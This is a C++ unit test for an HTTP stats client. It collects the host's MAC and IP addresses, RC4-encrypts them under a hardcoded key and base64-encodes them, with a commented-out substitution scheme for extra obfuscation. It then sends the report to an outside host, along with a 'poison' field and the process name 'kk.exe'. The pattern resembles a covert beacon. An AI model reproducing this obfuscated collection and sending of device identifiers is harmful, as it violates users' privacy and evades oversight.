

#include <net/http/http.h>
#include <net/winsock_init.h>
using namespace klib::net;

#include <util/strutil.h>
using namespace klib::util;

#include <encrypt/base64.h>
#include <encrypt/rc4_single.h>
using namespace klib::encode;

#include <comp/statics/src/stats_client.h>
#include <util/mac_extractor.h>
#include <net/addr_helper.h>
using namespace klib::net;

winsock_init  g_winsock_initor;

TEST(http, 1)
{
#define  form_str "pca*{mac},pod*{pid},uod*{uid},ip*{ip},os*winxp,poison*1_2_3_4,list*d:/asdasd/asds,status*1";

    std::string str_format = form_str;

    mac_extractor mac_;
    mac_.extract_mac_lst(e_extract_helpapi);
    std::string str_mac = mac_.get_mac_list().front().mac_;

    ipv4_list_type  ipv4s;
    addr_helper::get_ipv4_lst(ipv4s);
    ip_v4 addr = ipv4s.front();
    std::string str_ip = addr.to_str();

    str_format = Replace(str_format, "{random}", "z钓鱼岛是我们的联合国我们有人");
    str_format = Replace(str_format, "{mac}", str_mac);
    str_format = Replace(str_format, "{pid}", "11");
    str_format = Replace(str_format, "{uid}", "23");
    str_format = Replace(str_format, "{ip}",  str_ip);


    /*
    str_format = Replace(str_format, "==",  "QegZ27vc");
    str_format = Replace(str_format, "=",  "QegZ27vcZ");
    str_format = Replace(str_format, "O",  "IkL");
    str_format = Replace(str_format, "R",  "TgF");
    str_format = Replace(str_format, "A",  "SwD");
    */

    const std::string str_key = "ISD#$UYo&%iuIOU&^%$#";
    rc4_encrypt enc_;
    enc_.set_key(str_key.c_str(), str_key.size());
    enc_.encrypt((unsigned char*)str_format.c_str(), str_format.size());

    base64 b64;
    b64.encode(str_format.c_str(), str_format.size(), str_format, false);


    std::string str_decode;
    b64.decode(str_format, str_decode);
    /*
    ==  替换  QegZ27vc
    =   替换  QegZ27vcZ
    O   替换  IkL
    R   替换  TgF
    A   替换  SwD
    */

    stats_client* client = stats_client::instance();
    client->set_stats_method(e_http_get);
    client->set_url("http://inapi.91ox.com/csindex.php?");

    client->add_get_param("encode", str_format);
    client->add_get_param("process", "kk.exe");

    client->exec();
}